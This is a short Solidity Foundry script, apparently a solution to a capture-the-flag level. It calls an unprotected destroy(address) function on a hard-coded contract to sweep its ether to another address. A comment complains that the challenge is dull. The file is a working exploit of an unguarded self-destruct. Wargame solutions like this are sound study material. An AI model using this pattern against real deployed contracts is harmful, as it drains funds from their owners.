pragma solidity ^0.8.0;

import "forge-std/Script.sol";
//not a fun challenge, what's the point of this challenge?
contract RecoveryScript is Script {
    function run() external {
        vm.startBroadcast();
        address(0xF26b1b8c59441035845141d1674854Cd6Ea45825).call{value: 0}(abi.encodeWithSignature("destroy(address)", address(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707)));
    }
}